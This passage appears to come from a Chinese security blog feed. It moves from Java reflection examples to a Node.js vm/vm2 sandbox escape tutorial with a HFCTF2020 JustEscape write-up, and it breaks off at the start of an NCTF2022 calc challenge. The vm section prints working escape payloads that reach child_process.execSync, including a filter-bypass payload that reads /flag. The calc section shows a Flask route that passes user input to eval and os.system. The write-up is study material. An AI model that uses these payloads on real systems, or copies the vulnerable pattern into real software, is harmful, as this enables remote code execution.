class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        m = <span class="number">300</span>;</span><br><span class="line">        System.out.println(<span class="string">&quot;静态代码块初始化&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">static</span> <span class="type">int</span> <span class="variable">m</span> <span class="operator">=</span> <span class="number">100</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">A</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;无参构造初始化&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后打印结果：</p><img src="/2023/02/01/java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/2.png" class><p>贴上在网上找到一张图加深理解</p><img src="/2023/02/01/java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/3.png" class><h3 id="类加载器"><a href="#类加载器" class="headerlink" title="类加载器"></a>类加载器</h3><p>类加载器本质上也是一个类，将class字节码文件加载到内存中，它把类的静态数据都转换为存放在方法区里的数据结构，并且在堆中生成一个代表这个类的java.lang.Class对象。</p><img src="/2023/02/01/java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/4.png" class><p>反射就是通过类加载器访问方法区中的类数据。在java中有四种类加载器</p><img src="/2023/02/01/java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/5.png" class><p>跟着写个代码获取类加载器。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.Reflection;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test01</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="comment">//获取系统类的加载器</span></span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">a</span> <span class="operator">=</span> ClassLoader.getSystemClassLoader();</span><br><span class="line">        System.out.println(<span class="string">&quot;系统类加载器为：&quot;</span>+a);</span><br><span class="line">        <span class="comment">//获取它的父类的加载器</span></span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">b</span> <span class="operator">=</span> a.getParent();</span><br><span class="line">        System.out.println(<span class="string">&quot;扩展类加载器为：&quot;</span>+b);</span><br><span class="line">        <span class="comment">//再获取它的父类的父类的加载器</span></span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">c</span> <span class="operator">=</span> b.getParent();</span><br><span class="line">        System.out.println(<span class="string">&quot;根加载器为：&quot;</span>+c);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>得到的运行结果为</p><img src="/2023/02/01/java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/6.png" class><p>由于根加载器是由c++编写的，所以java读取不到，返回null。从这段代码可以看出jvm的类加载器是有继承关系的，当一个类要被加载时，不考虑自定义加载器，首先会在系统类加载器检索是否已经加载过（因为有类缓存），如果有就无需加载，反之会拿到父加载器，继续检索，依次往上递归，直到根加载器，如果根加载器也没有加载过，根加载器就会考虑加载类，如果根加载器无法加载，就会往下递归，直到底层加载器加载，如果加载不了，就会抛出异常错误，这就是java的双亲委派机制。这么做是为了防止加载类与jdk中的同名冲突，如果有人想恶意替换系统类，然而这些系统类都被根加载器加载过了，防止恶意代码的植入。</p><h3 id="通过反射获得类信息"><a href="#通过反射获得类信息" class="headerlink" title="通过反射获得类信息"></a>通过反射获得类信息</h3><p>写个代码很快理解：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.Reflection;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test02</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, NoSuchFieldException &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c1</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;com.Reflection.webdog01&quot;</span>);<span class="comment">//获取类对象</span></span><br><span class="line">        System.out.println(c1.getName());<span class="comment">//获取类名</span></span><br><span class="line">        <span class="comment">//获得类的属性</span></span><br><span class="line">        Field[] fields = c1.getDeclaredFields();</span><br><span class="line">        <span class="comment">//getDeclaredFields()获取所有属性，getFields()获取public属性</span></span><br><span class="line">        System.out.println(<span class="string">&quot;-------获取类属性-------&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span>(Field field : fields)&#123;</span><br><span class="line">            System.out.println(field);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//获取指定属性的值</span></span><br><span class="line">        System.out.println(<span class="string">&quot;-------获得指定属性------&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">name</span> <span class="operator">=</span> c1.getField(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">        System.out.println(name);</span><br><span class="line">        <span class="comment">//获得类的方法</span></span><br><span class="line">        System.out.println(<span class="string">&quot;-------获得类的方法---------&quot;</span>);</span><br><span class="line">        Method[] method = c1.getMethods();</span><br><span class="line">        <span class="keyword">for</span>(Method method1 : method)&#123;</span><br><span class="line">            System.out.println(method1);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        利用getDeclaredMethods方法获取的是类中所有的方法，包括public和非public的方法，但不包括继承的方法：</span></span><br><span class="line"><span class="comment">        利用getMethods()方法可以获取到类中所有public的方法，其中包括父类的方法</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        <span class="comment">//获得指定方法</span></span><br><span class="line">        System.out.println(<span class="string">&quot;-------获得指定方法--------&quot;</span>);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">a1</span> <span class="operator">=</span> c1.getMethod(<span class="string">&quot;setLang&quot;</span>, String.class);</span><br><span class="line">        System.out.println(a1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">webdog01</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> age;</span><br><span class="line">    <span class="keyword">private</span> String lang;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">webdog01</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;初始化&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getLang</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.lang;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span>  <span class="title function_">setLang</span><span class="params">(String lang)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.lang = lang;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看看执行结果：</p><img src="/2023/02/01/java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/7.png" class><h3 id="动态创建对象"><a href="#动态创建对象" class="headerlink" title="动态创建对象"></a>动态创建对象</h3><p>利用class对象的一个newInstance()函数，但是这种方法只能调用类中的无参构造方法。还有一种方法是通过构造器创建对象，使用Constructor对象的newInstance()方法可以调用有参和无参的构造方法创建对象。写个例子看看反射能干些什么事。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.Reflection;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test01</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, InstantiationException, IllegalAccessException, NoSuchMethodException, InvocationTargetException, NoSuchFieldException &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c1</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;com.Reflection.webdog02&quot;</span>);</span><br><span class="line">        <span class="comment">//构造一个对象</span></span><br><span class="line">        <span class="type">webdog02</span> <span class="variable">a1</span> <span class="operator">=</span> (webdog02) c1.newInstance();</span><br><span class="line">        System.out.println(a1);</span><br><span class="line">        <span class="comment">//通过构造器创建对象</span></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> c1.getDeclaredConstructor(String.class);<span class="comment">//拿到构造器</span></span><br><span class="line">        <span class="comment">//其中getDeclaredConstructor()方法返回的是public和非public的构造器，</span></span><br><span class="line">        <span class="comment">// 而getConstructor()方法只制定参数类型访问权限是public的构造器</span></span><br><span class="line">        <span class="type">webdog02</span> <span class="variable">a2</span> <span class="operator">=</span> (webdog02) constructor.newInstance(<span class="string">&quot;XiLitter&quot;</span>);</span><br><span class="line">        System.out.println(a2);</span><br><span class="line">        <span class="comment">//通过反射获取一个方法</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">named</span> <span class="operator">=</span> c1.getDeclaredMethod(<span class="string">&quot;named&quot;</span>,String.class);</span><br><span class="line">        named.invoke(a2,<span class="string">&quot;XiLitter&quot;</span>);<span class="comment">//激活方法</span></span><br><span class="line">        <span class="comment">//invoke方法，第一个参数为对象，第二个参数为激活的方法传值</span></span><br><span class="line">        System.out.println(<span class="string">&quot;名字是&quot;</span>+a2.names());</span><br><span class="line">        <span class="comment">//通过反射获取属性</span></span><br><span class="line">        <span class="type">webdog02</span> <span class="variable">a3</span> <span class="operator">=</span> (webdog02) c1.newInstance();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">name</span> <span class="operator">=</span> c1.getDeclaredField(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">        <span class="comment">//通过set方法修改属性（只能修改public属性）</span></span><br><span class="line">        <span class="comment">//添加代码  name.setAccessible(true);可以修改私有属性</span></span><br><span class="line">        name.set(a3,<span class="string">&quot;dog&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;名字是&quot;</span>+a3.names());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">webdog02</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">webdog02</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;获得了无参构造方法&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">webdog02</span><span class="params">(String name)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        System.out.println(<span class="string">&quot;调用了有参构造&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sample</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;调用了普通方法&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">named</span><span class="params">(String name)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">names</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看看运行结果：</p><img src="/2023/02/01/java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/8.png" class><p>java反射增加了java语言的动态性，不用担心写死代码了，更加灵活方便。但是同时它也会带来一些问题，反射是一种解释操作，它要向java虚拟机解释应该怎么做，所以它比直接执行代码要慢得多。另外我们上面例子也能看出，我们可以直接通过反射来修改莫个类的私有属性，这打破了java的封装特性。使用反射也会带来一些安全问题（不了解）</p><h2 id="相关链接："><a href="#相关链接：" class="headerlink" title="相关链接："></a>相关链接：</h2><p><a href="https://www.bilibili.com/video/BV1p4411P7V3/?p=14">https://www.bilibili.com/video/BV1p4411P7V3/?p=14</a></p><p><a href="http://blog.m1kael.cn/index.php/archives/421/">http://blog.m1kael.cn/index.php/archives/421/</a></p>]]></content>
      
      
      <categories>
          
          <category> java安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vm沙箱逃逸初探</title>
      <link href="/2023/01/31/vm%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%88%9D%E6%8E%A2/"/>
      <url>/2023/01/31/vm%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%88%9D%E6%8E%A2/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>前几天遇到一个考察vm沙箱逃逸的题目，由于这个点是第一次听说，所以就花时间了解了解什么是沙箱逃逸。此篇文章是对于自己初学vm沙箱逃逸的学习记录，若记录知识有误，欢迎师傅们指正。</p><h2 id="什么是沙箱"><a href="#什么是沙箱" class="headerlink" title="什么是沙箱"></a>什么是沙箱</h2><p>就只针对于node.js而言，沙箱和docker容器其实是差不多的，都是将程序与程序之间，程序与主机之间互相分隔开，但是沙箱是为了隔离有害程序的，避免影响到主机环境。为什么node.js语言要引入沙箱，这就要说说js语言中的作用域（也叫上下文）。说一大堆概念不如贴一段代码来的实在：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> a = <span class="built_in">require</span>(<span class="string">&quot;./a&quot;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a.<span class="property">age</span>)</span><br><span class="line"><span class="comment">//a.js:var age = 100;-------&gt;输出undefined</span></span><br><span class="line"><span class="comment">//-------------------------//</span></span><br><span class="line"><span class="comment">//a.js:var age = 100;exports.age = age;--------&gt;输出100</span></span><br></pre></td></tr></table></figure><p>若没有exports将需要的属性暴露出来，我们是访问不到另一个包内的属性的。包与包之间是互不相通的，也就是说每一个包都有自己的作用域。我们知道JavaScript的全局变量是window。其中所有的属性都是挂载到这个window下的，当然，node也有全局变量，是global。全局变量能在包间访问，换句话说，所有的包都挂载在全局变量下。node执行rce需要引入process对象进而导入child_process模块来执行命令。然而，process是挂载到global上的。为了防止恶意代码影响主机环境，所以就引入沙箱，开辟一个新的作用域来运行不信任的代码。相较于其他作用域，它阻止我们从内部直接访问global全局变量。此后的逃逸也是在这个点做文章。</p><h2 id="vm模块的作用"><a href="#vm模块的作用" class="headerlink" title="vm模块的作用"></a>vm模块的作用</h2><p>引入vm模块就是为了创建一个沙箱运行环境。先看一段代码：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> util = <span class="built_in">require</span>(<span class="string">&#x27;util&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&#x27;vm&#x27;</span>);</span><br><span class="line"><span class="variable language_">global</span>.<span class="property">age</span> = <span class="number">3</span>;</span><br><span class="line"><span class="keyword">const</span> sandbox = &#123; <span class="attr">age</span>: <span class="number">1</span> &#125;;</span><br><span class="line">vm.<span class="title function_">createContext</span>(sandbox);</span><br><span class="line">vm.<span class="title function_">runInContext</span>(<span class="string">&#x27;age *= 2;&#x27;</span>, sandbox);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(util.<span class="title function_">inspect</span>(sandbox));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(util.<span class="title function_">inspect</span>(age));</span><br><span class="line"><span class="comment">//输出</span></span><br><span class="line"><span class="comment">//&#123; age: 2 &#125;</span></span><br><span class="line"><span class="comment">//3</span></span><br></pre></td></tr></table></figure><p>vm.createContext函数，创建一个沙箱对象，在全局变量global外又创建一个作用域。此时sandbox对象就是此作用域的全局变量。vm.runInContext函数，第一个参数是沙箱内要执行的代码，第二个是沙箱对象。还有一个函数，vm.runInNewContext，是creatContext和runInContext的结合版，传入要执行的代码和沙箱对象。根据代码输出，我们可以看出沙箱内是不能访问到global。</p><h2 id="如何逃逸"><a href="#如何逃逸" class="headerlink" title="如何逃逸"></a>如何逃逸</h2><p>上文也说明了node要执行命令的前提是访问到process对象。那么逃逸的主要思路就是怎么从外面的global全局变量中拿到process。vm模块是非常不严谨的，基于node原型链继承的特性，我们很容易就能拿到外部全局变量。看一段简单的逃逸代码：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="meta">&quot;use strict&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&quot;vm&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> a = vm.<span class="title function_">runInNewContext</span>(<span class="string">`this.constructor.constructor(&#x27;return global&#x27;)()`</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a.<span class="property">process</span>);</span><br></pre></td></tr></table></figure><p>运行结果为</p><img src="/2023/01/31/vm%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%88%9D%E6%8E%A2/118.png" class><p>很明显是逃逸出去了。如何做到的？这里的this是指向传递到runInNewContext函数的一个对象，他是不属于沙箱内部环境的，访问当前对象的构造器的构造器，也就是Function的构造器，由于继承关系，它的作用域是全局变量，执行代码，获取外部global。拿到process对象就可以执行命令了。继续看代码：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="meta">&quot;use strict&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&quot;vm&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> a = vm.<span class="title function_">runInNewContext</span>(<span class="string">`this.constructor.constructor(&#x27;return process&#x27;)()`</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a.<span class="property">mainModule</span>.<span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">execSync</span>(<span class="string">&#x27;whoami&#x27;</span>).<span class="title function_">toString</span>());</span><br></pre></td></tr></table></figure><p> 执行结果：</p><p>console.log会执行node代码，从而调用构造器函数返回process对象导致rce。vm模块的隔离作用可以说非常的差了。所以开发者在此基础上加以完善，推出了vm2模块。那么vm2模块能否逃逸。</p><p>vm2相较于vm多了很多限制。其中之一就是引入了es6新增的proxy特性。增加一些规则来限制constructor函数以及___proto__这些属性的访问。proxy可以认为是代理拦截，编写一种机制对外部访问进行过滤或者改写。直接看文档中的例子，文档链接：<a href="https://es6.ruanyifeng.com/?search=weakmap&x=0&y=0#docs/proxy">ES6 入门教程</a></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> proxy = <span class="keyword">new</span> <span class="title class_">Proxy</span>(&#123;&#125;, &#123;</span><br><span class="line">  <span class="attr">get</span>: <span class="keyword">function</span>(<span class="params">target, propKey</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">35</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line">proxy.<span class="property">time</span> <span class="comment">// 35</span></span><br><span class="line">proxy.<span class="property">name</span> <span class="comment">// 35</span></span><br><span class="line">proxy.<span class="property">title</span> <span class="comment">// 35</span></span><br></pre></td></tr></table></figure><img src="/2023/01/31/vm%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%88%9D%E6%8E%A2/120.png" class><p> vm2的版本一直都在更新迭代。github上许多历史版本的逃逸exp，附上链接：<a href="https://github.com/patriksimek/vm2/issues?q=is:issue+author:XmiliaH+is:closed">Issues · patriksimek&#x2F;vm2 · GitHub</a>，至于vm2的逃逸原理分析，直接看大牛的文章，写的非常nice，文章链接：<a href="https://www.anquanke.com/post/id/207291#h2-1">vm2沙箱逃逸分析-安全客 - 安全资讯平台</a>。接着做个题感受一下。</p><h2 id="HFCTF2020-JustEscape"><a href="#HFCTF2020-JustEscape" class="headerlink" title="[HFCTF2020]JustEscape"></a>[HFCTF2020]JustEscape</h2><p>题目代码：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>( <span class="title function_ invoke__">array_key_exists</span>( <span class="string">&quot;code&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; <span class="variable">$_GET</span>[ <span class="string">&#x27;code&#x27;</span> ] != <span class="literal">NULL</span> ) &#123;</span><br><span class="line">    <span class="variable">$code</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">echo</span> <span class="keyword">eval</span>(code);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>题目中提示我们不是php，当然eval函数也不只有php有。测试eval是js语言的，可以输入Error().stack。它的作用是返回代码的部分信息。</p><img src="/2023/01/31/vm%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%88%9D%E6%8E%A2/121.png" class><p>了解到引入了vm2沙箱。GitHub上有师傅发的逃逸脚本可以直接打。附上链接：<a href="https://github.com/patriksimek/vm2/issues/225">Breakout in v3.8.3 · Issue #225 · patriksimek&#x2F;vm2 · GitHub</a>。有两个exp都能打通。看一下第一个exp：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">(<span class="string">&#x27; + function()&#123;</span></span><br><span class="line"><span class="string">TypeError.prototype.get_process = f=&gt;f.constructor(&quot;return process&quot;)();</span></span><br><span class="line"><span class="string">try&#123;</span></span><br><span class="line"><span class="string">Object.preventExtensions(Buffer.from(&quot;&quot;)).a = 1;</span></span><br><span class="line"><span class="string">&#125;catch(e)&#123;</span></span><br><span class="line"><span class="string">return e.get_process(()=&gt;&#123;&#125;).mainModule.require(&quot;child_process&quot;).execSync(&quot;whoami&quot;).toString();</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&#125;+&#x27;</span>)()</span><br></pre></td></tr></table></figure><p>网上找半天都没有详细解释代码，于是自己琢磨了一下。若分析有误，希望师傅们指正。先来看看Object.preventExtensions函数，让一个对象不能再添加一个新的属性。如果尝试添加新的属性，就会抛出typeError。</p><img src="/2023/01/31/vm%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%88%9D%E6%8E%A2/122.png" class><p>上面代码尝试添加a属性。导致异常就会抛出TypeError对象。这里进行了一个操作，污染了TypeError的原型。TypeError是外部的对象，这里将它的原型添加get_process属性，并且在此基础上调用构造器函数，此时它 的作用域就是global了。抛出的TypeError对象由e捕捉，访问get_process属性，从原型里拿，进而触发构造器函数，返回process对象执行命令。</p><p>则第二个exp有点像上文vm2原理分析的案例二。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">(<span class="string">&#x27; + function()&#123;</span></span><br><span class="line"><span class="string">try&#123;</span></span><br><span class="line"><span class="string">Buffer.from(new Proxy(&#123;&#125;, &#123;</span></span><br><span class="line"><span class="string">getOwnPropertyDescriptor()&#123;</span></span><br><span class="line"><span class="string">throw f=&gt;f.constructor(&quot;return process&quot;)();</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&#125;));</span></span><br><span class="line"><span class="string">&#125;catch(e)&#123;</span></span><br><span class="line"><span class="string">return e(()=&gt;&#123;&#125;).mainModule.require(&quot;child_process&quot;).execSync(&quot;whoami&quot;).toString();</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&#125;+&#x27;</span>)()</span><br></pre></td></tr></table></figure><p>创建一个代理，我猜测getOwnPropertyDescriptor函数用于Proxy第二个参数传递会发生异常。vm2内部抛出异常并捕获，然后vm2沙箱自己封装成一个对象再次抛出，被捕获，此时这个对象的作用域就变成了global，执行抛出的代码可以拿到process对象了。</p><p>截止目前，我们并不能做出这道题。因为还有waf过滤了许多关键词，这里就要用到一个点，利用js的模板文字绕过，直接看个例子就能明白。</p><img src="/2023/01/31/vm%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%88%9D%E6%8E%A2/123.png" class><p>把过滤掉的关键字都换成这种模板文字，最终payload为：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">(<span class="keyword">function</span> (<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">TypeError</span>[<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`prototyp`</span>&#125;</span>e`</span>&#125;</span>`</span>][<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`get_proces`</span>&#125;</span>s`</span>&#125;</span>`</span>] = <span class="function"><span class="params">f</span>=&gt;</span>f[<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`constructo`</span>&#125;</span>r`</span>&#125;</span>`</span>](<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`return this.proces`</span>&#125;</span>s`</span>&#125;</span>`</span>)();</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="title class_">Object</span>.<span class="title function_">preventExtensions</span>(<span class="title class_">Buffer</span>.<span class="title function_">from</span>(<span class="string">``</span>)).<span class="property">a</span> = <span class="number">1</span>;</span><br><span class="line">    &#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">        <span class="keyword">return</span> e[<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`get_proces`</span>&#125;</span>s`</span>&#125;</span>`</span>](<span class="function">()=&gt;</span>&#123;&#125;).<span class="property">mainModule</span>[<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`requir`</span>&#125;</span>e`</span>&#125;</span>`</span>](<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`child_proces`</span>&#125;</span>s`</span>&#125;</span>`</span>)[<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`exe`</span>&#125;</span>cSync`</span>&#125;</span>`</span>](<span class="string">`cat /flag`</span>).<span class="title function_">toString</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)()</span><br></pre></td></tr></table></figure><p> 打入payload即可获得flag。</p><h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>vm2版本一直在更新，而逃逸脚本也穷出不穷，而在去年也爆出了新的vm沙箱逃逸的cve。以后有时间继续琢磨沙箱逃逸脚本。此外贴上vm沙箱逃逸的优秀文章：</p><p><a href="https://xz.aliyun.com/t/11859#toc-3">NodeJS VM和VM2沙箱逃逸 - 先知社区</a></p><p><a href="https://www.cnblogs.com/zpchcbd/p/16899212.html">nodejs vm&#x2F;vm2沙箱逃逸分析 - zpchcbd - 博客园</a></p>]]></content>
      
      
      <categories>
          
          <category> node.js安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> node.js </tag>
            
            <tag> 沙箱逃逸 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NCTF2022 calc题目</title>
      <link href="/2023/01/31/NCTF2022-calc%E9%A2%98%E7%9B%AE/"/>
      <url>/2023/01/31/NCTF2022-calc%E9%A2%98%E7%9B%AE/</url>
      
        <content type="html"><![CDATA[<h2 id="calc（环境变量注入getshell）"><a href="#calc（环境变量注入getshell）" class="headerlink" title="calc（环境变量注入getshell）"></a>calc（环境变量注入getshell）</h2><p>经典计算器题目，看着有点眼熟，没错，就是buu三月赛的一道题目。由于那时候web可能都算不上入门，所以也就没有复现。比赛时就网上看了看三月赛的wp，但是没有什么用，因为过滤更加严格了，看题目代码：</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/calc&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">calc</span>():</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    num = request.values.get(<span class="string">&quot;num&quot;</span>)</span><br><span class="line">    log = <span class="string">&quot;echo &#123;0&#125; &#123;1&#125; &#123;2&#125;&gt; ./tmp/log.txt&quot;</span>.<span class="built_in">format</span>(time.strftime(<span class="string">&quot;%Y%m%d-%H%M%S&quot;</span>, time.localtime()), ip,num)</span><br><span class="line">    <span class="keyword">if</span> waf(num):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            data = <span class="built_in">eval</span>(num)</span><br><span class="line">            os.system(log)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">str</span>(data)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;waf!!&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">s</span>):</span><br><span class="line">    blacklist = [<span 